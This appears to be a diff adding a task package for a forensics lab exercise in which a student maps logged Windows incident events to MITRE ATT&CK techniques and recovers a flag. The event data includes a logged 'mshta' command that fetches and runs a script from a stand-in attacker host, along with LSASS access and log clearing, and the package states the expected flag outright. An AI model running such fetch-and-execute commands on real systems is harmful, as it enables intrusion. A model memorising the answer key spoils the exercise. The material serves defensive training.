@@ -1,0 +1,49 @@
+{
+  "id": "forensics-attack-mapping",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{4tt4ck_k1ll_ch41n_m4pp3d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: маппинг на MITRE ATT&CK\n\n`events.jsonl` — события инцидента, `attack_map.json` — таблица техник.\n\n1. Запусти `python3 attack_map_run.py` — получишь kill-chain.\n\nФлаг `nto{...}` — в артефакте-маркере. Запиши его в `found.txt`.\n"
+    },
+    {
+      "path": "/home/student/task/events.jsonl",
+      "text": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"svchost.exe -k netsvcs\"}\n{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\mshta.exe\", \"CommandLine\": \"mshta http://evil.tld/x.hta\"}\n{\"EventID\": 106, \"TaskName\": \"Updater\"}\n{\"EventID\": 10, \"TargetImage\": \"C:\\\\Windows\\\\System32\\\\lsass.exe\", \"SourceImage\": \"C:\\\\Tools\\\\x.exe\"}\n{\"EventID\": 1102, \"Channel\": \"Security\"}\n{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"cmd.exe /c copy C:\\\\marker\\\\nto{4tt4ck_k1ll_ch41n_m4pp3d} C:\\\\Temp\\\\\"}\n"
+    },
+    {
+      "path": "/home/student/task/attack_map.json",
+      "text": "{\n \"1:mshta\": {\n  \"tactic\": \"Execution\",\n  \"tech\": \"T1218.005 (Mshta)\"\n },\n \"106\": {\n  \"tactic\": \"Persistence\",\n  \"tech\": \"T1053.005 (Scheduled Task)\"\n },\n \"10:lsass\": {\n  \"tactic\": \"Credential Access\",\n  \"tech\": \"T1003.001 (LSASS Memory)\"\n },\n \"1102\": {\n  \"tactic\": \"Defense Evasion\",\n  \"tech\": \"T1070.001 (Clear Event Logs)\"\n }\n}"
+    },
+    {
+      "path": "/home/student/task/attack_map_run.py",
+      "text": "#!/usr/bin/env python3\n# Map incident artifacts to MITRE ATT&CK techniques, ordered by kill chain.\nimport json\namap = json.load(open(\"attack_map.json\"))\nchain = []\nmarker = None\nfor ln in open(\"events.jsonl\"):\n    e = json.loads(ln)\n    if e[\"EventID\"] == 1 and \"mshta\" in e.get(\"Image\", \"\"):\n        chain.append(amap[\"1:mshta\"]); \n    if e[\"EventID\"] == 106:\n        chain.append(amap[\"106\"])\n    if e[\"EventID\"] == 10 and \"lsass\" in e.get(\"TargetImage\", \"\"):\n        chain.append(amap[\"10:lsass\"])\n    if e[\"EventID\"] == 1102:\n        chain.append(amap[\"1102\"])\n    cl = e.get(\"CommandLine\", \"\")\n    if \"nto{\" in cl:\n        marker = cl\nfor step in chain:\n    print(\"[%-18s] %s\" % (step[\"tactic\"], step[\"tech\"]))\nprint(\"artifact marker:\", marker.split(\"marker\\\\\")[-1].split()[0] if marker else \"none\")\n"
+    }
+  ],
+  "tools": {
+    "python3": {
+      "help": "python3 <скрипт.py> — интерпретатор Python (вывод захвачен из реального запуска)",
+      "cases": [
+        {
+          "match": "--version|^-V$",
+          "example": "python3 --version",
+          "output": "Python 3.12.4"
+        },
+        {
+          "match": "attack_map_run\\.py",
+          "example": "python3 attack_map_run.py",
+          "output": "[Execution         ] T1218.005 (Mshta)\n[Persistence       ] T1053.005 (Scheduled Task)\n[Credential Access ] T1003.001 (LSASS Memory)\n[Defense Evasion   ] T1070.001 (Clear Event Logs)\nartifact marker: nto{4tt4ck_k1ll_ch41n_m4pp3d}\n"
+        }
+      ],
+      "fallback": "python3: доступно `python3 attack_map_run.py`\n"
+    }
+  }
+}
